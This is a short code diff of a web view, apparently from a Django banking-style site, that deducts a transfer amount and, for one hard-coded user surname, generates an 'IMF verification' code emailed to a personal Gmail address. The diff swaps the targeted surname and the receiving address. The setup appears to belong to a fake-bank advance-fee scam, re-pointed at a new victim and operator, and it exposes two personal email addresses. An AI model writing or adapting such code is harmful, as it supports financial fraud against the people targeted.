@@ -179,7 +179,7 @@ def transaction_page(request):
                 u_profile.amount -= transaction_amount
                 u_profile.save()
 
-                if request.user.last_name.lower() == "grayson":
+                if request.user.last_name.lower() == "taylor":
                     # Trigger IMF verification
                     imf_code = get_random_string(length=6, allowed_chars="0123456789")
 
@@ -201,7 +201,7 @@ def transaction_page(request):
                         subject,
                         plain_message,
                         settings.DEFAULT_FROM_EMAIL,
-                        ["floxixspprtservice@gmail.com"]
+                        ["successsimeon484@gmail.com"]
                     )
                     email.attach_alternative(html_message, "text/html")
 
